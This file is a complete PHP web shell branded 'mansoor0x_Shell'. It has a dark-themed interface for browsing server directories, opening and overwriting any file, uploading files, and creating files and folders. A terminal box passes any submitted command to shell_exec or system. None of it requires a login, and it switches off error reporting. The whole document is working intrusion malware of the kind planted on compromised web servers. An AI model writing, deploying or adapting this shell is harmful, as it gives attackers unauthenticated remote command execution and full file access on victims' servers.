<?php error_reporting(0);ini_set('max_execution_time',0);$current_dir=isset($_GET['dir'])?realpath($_GET['dir']):getcwd();if(!$current_dir||!is_dir($current_dir)){$current_dir=getcwd();}chdir($current_dir);function getNicePermissions($path){$perms=fileperms($path);if(($perms&0xC000)==0xC000)$info='s';elseif(($perms&0xA000)==0xA000)$info='l';elseif(($perms&0x8000)==0x8000)$info='-';elseif(($perms&0x4000)==0x4000)$info='d';else $info='-';$info.=(($perms&0x0100)?'r':'-');$info.=(($perms&0x0080)?'w':'-');$info.=(($perms&0x0040)?'x':'-');$info.=(($perms&0x0020)?'r':'-');$info.=(($perms&0x0010)?'w':'-');$info.=(($perms&0x0008)?'x':'-');$info.=(($perms&0x0004)?'r':'-');$info.=(($perms&0x0002)?'w':'-');$info.=(($perms&0x0001)?'x':'-');return $info;}$editor_msg="";if(isset($_POST['save_file_path'])&&isset($_POST['edited_content'])){if(file_put_contents($_POST['save_file_path'],$_POST['edited_content'])!==false){$editor_msg="<span style='color:#50fa7b;'>✓ Saved!</span>";}else{$editor_msg="<span style='color:#ff5555;'>✗ Failed!</span>";}}$open_file_content="";$open_file_path="";if(isset($_GET['open_file'])){$open_file_path=realpath($_GET['open_file']);if($open_file_path&&is_file($open_file_path)){$open_file_content=file_get_contents($open_file_path);}}$upload_msg="";if(isset($_FILES['file_to_upload'])){$target_file=$current_dir.DIRECTORY_SEPARATOR.basename($_FILES['file_to_upload']['name']);if(move_uploaded_file($_FILES['file_to_upload']['tmp_name'],$target_file)){$upload_msg="<p style='color:#50fa7b;'>✓ Uploaded!</p>";}else{$upload_msg="<p style='color:#ff5555;'>✗ Failed!</p>";}}if(isset($_POST['new_file_name'])){$new_file=$current_dir.DIRECTORY_SEPARATOR.$_POST['new_file_name'];file_put_contents($new_file,$_POST['file_content']??"");}if(isset($_POST['new_folder_name'])){$new_folder=$current_dir.DIRECTORY_SEPARATOR.$_POST['new_folder_name'];if(!file_exists($new_folder)){mkdir($new_folder,0777,true);}}$output="";$cmd="";if(isset($_POST['cmd'])&&!empty($_POST['cmd'])){$cmd=$_POST['cmd'];if(function_exists('shell_exec')){$output=shell_exec($cmd);}elseif(function_exists('system')){ob_start();system($cmd);$output=ob_get_contents();ob_end_clean();}}$files=scandir($current_dir);$current_user=function_exists('posix_getpwuid')&&function_exists('posix_geteuid')?posix_getpwuid(posix_geteuid())['name']:get_current_user();?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>mansoor0x_Shell</title><style>:root{--bg:#0d1117;--panel:#161b22;--border:#30363d;--text:#c9d1d9;--pink:#ff79c6;--cyan:#8be9fd;--green:#50fa7b;--orange:#ffb86c;}body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);margin:0;padding:20px;}.container{max-width:1200px;margin:0 auto;background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,0.5);}.header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border);padding-bottom:15px;margin-bottom:20px;}.logo{font-size:24px;font-weight:bold;color:var(--pink);font-family:monospace;}.path-bar{background:var(--bg);border:1px solid var(--border);padding:10px 15px;border-radius:6px;font-family:monospace;color:var(--cyan);margin-bottom:20px;word-break:break-all;}.tools-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:15px;margin-bottom:20px;}.tool-box{background:var(--bg);border:1px solid var(--border);padding:15px;border-radius:6px;}.tool-box h3{margin-top:0;font-size:14px;color:var(--pink);text-transform:uppercase;}input[type="text"],textarea,input[type="file"]{width:100%;background:var(--panel);border:1px solid var(--border);padding:8px;color:#fff;border-radius:4px;box-sizing:border-box;margin-bottom:10px;font-family:monospace;}button{background:var(--pink);color:#000;border:none;padding:8px 15px;font-weight:bold;border-radius:4px;cursor:pointer;}.editor-section{background:#282a36;border:1px solid var(--pink);padding:20px;border-radius:6px;margin-bottom:25px;}.editor-textarea{background:#1e1f29;color:#f8f8f2;border:1px solid #44475a;font-family:'Courier New',monospace;font-size:14px;height:250px;resize:vertical;}.file-table{width:100%;border-collapse:collapse;margin-bottom:30px;background:var(--bg);border-radius:6px;overflow:hidden;border:1px solid var(--border);}.file-table th,.file-table td{padding:12px;text-align:left;border-bottom:1px solid var(--border);font-size:14px;}.file-table th{background:#1f242c;color:var(--pink);}.file-table a{color:var(--cyan);text-decoration:none;font-family:monospace;}.file-table a:hover{text-decoration:underline;}.status-writable{color:var(--green);font-weight:bold;font-size:12px;background:rgba(80,250,123,0.1);padding:2px 6px;border-radius:4px;border:1px solid rgba(80,250,123,0.2);}.status-readable{color:var(--cyan);font-weight:bold;font-size:12px;background:rgba(139,233,253,0.1);padding:2px 6px;border-radius:4px;}.terminal-box{background:#000;border:1px solid var(--border);border-radius:6px;overflow:hidden;}.term-head{background:var(--panel);padding:10px;color:#8b949e;font-size:12px;font-family:monospace;border-bottom:1px solid var(--border);}.term-body{padding:15px;min-height:120px;max-height:250px;overflow-y:auto;font-family:monospace;}.prompt{color:var(--green);}</style></head><body><div class="container"><div class="header"><div class="logo">mansoor0x_Shell</div><div style="font-size:12px;color:#8b949e;">User: <span style="color:var(--green);"><?php echo $current_user;?></span></div></div><div class="path-bar">📍 Path: <?php echo htmlspecialchars($current_dir);?></div><?php if(!empty($open_file_path)):?><div class="editor-section"><h3 style="color:var(--cyan);margin-top:0;">📝 File: <span style="color:#fff;font-family:monospace;"><?php echo basename($open_file_path);?></span></h3><form method="POST" action="?dir=<?php echo urlencode($current_dir);?>"><input type="hidden" name="save_file_path" value="<?php echo htmlspecialchars($open_file_path);?>"><textarea class="editor-textarea" name="edited_content"><?php echo htmlspecialchars($open_file_content);?></textarea><button type="submit">Save Changes</button><?php echo $editor_msg;?></form></div><?php endif;?><div class="tools-grid"><div class="tool-box"><h3>Upload</h3><form method="POST" enctype="multipart/form-data"><input type="file" name="file_to_upload" required><button type="submit">Upload</button></form><?php echo $upload_msg;?></div><div class="tool-box"><h3>Create File</h3><form method="POST"><input type="text" name="new_file_name" placeholder="script.txt" required><button type="submit">Create</button></form></div><div class="tool-box"><h3>New Folder</h3><form method="POST"><input type="text" name="new_folder_name" placeholder="Folder Name" required><button type="submit">Create Folder</button></form></div></div><h3 style="color:var(--pink);font-size:16px;font-family:monospace;margin-bottom:10px;">🗂 Explorer</h3><table class="file-table"><thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Status</th></tr></thead><tbody><tr><td colspan="5"><span style="color:var(--orange);">📁</span> <a href="?dir=<?php echo urlencode(dirname($current_dir));?>">.. (Back)</a></td></tr><?php foreach($files as $file){if($file=='.'||$file=='..')continue;$full_path=$current_dir.DIRECTORY_SEPARATOR.$file;$is_directory=is_dir($full_path);$size=$is_directory?"-":number_format(filesize($full_path))." bytes";$text_perms=getNicePermissions($full_path);$is_writable=is_writable($full_path);echo "<tr>";if($is_directory){echo "<td><span style='color:var(--orange);font-weight:bold;'>📁</span> <a href='?dir=".urlencode($full_path)."'>".htmlspecialchars($file)."</a></td>";echo "<td style='color:var(--orange);'>Directory</td>";}else{echo "<td><span style='color:var(--cyan);'>📄</span> <a href='?dir=".urlencode($current_dir)."&open_file=".urlencode($full_path)."' style='color:#fff;font-weight:bold;'>".htmlspecialchars($file)."</a></td>";echo "<td style='color:var(--cyan);'>File</td>";}echo "<td style='font-family:monospace;'>$size</td>";echo "<td style='color:#6272a4;font-family:monospace;'>$text_perms</td>";if($is_writable){echo "<td><span class='status-writable'>🟢 Writable</span></td>";}else{echo "<td><span class='status-readable'>🔵 Read-Only</span></td>";}echo "</tr>";}?></tbody></table><div class="terminal-box"><div class="term-head">mansoor0x@terminal</div><div class="term-body"><?php if(!empty($cmd)):?><div class="prompt">mansoor0x$ <?php echo htmlspecialchars($cmd);?></div><pre style="color:#fff;white-space:pre-wrap;margin-top:5px;font-family:monospace;"><?php echo htmlspecialchars($output);?></pre><?php endif;?></div><form method="POST" style="display:flex;background:var(--panel);padding:10px;border-top:1px solid var(--border);"><input type="text" name="cmd" placeholder="Command..." style="flex:1;margin-bottom:0;" autocomplete="off"><button type="submit" style="margin-left:10px;">Execute</button></form></div></div></body></html>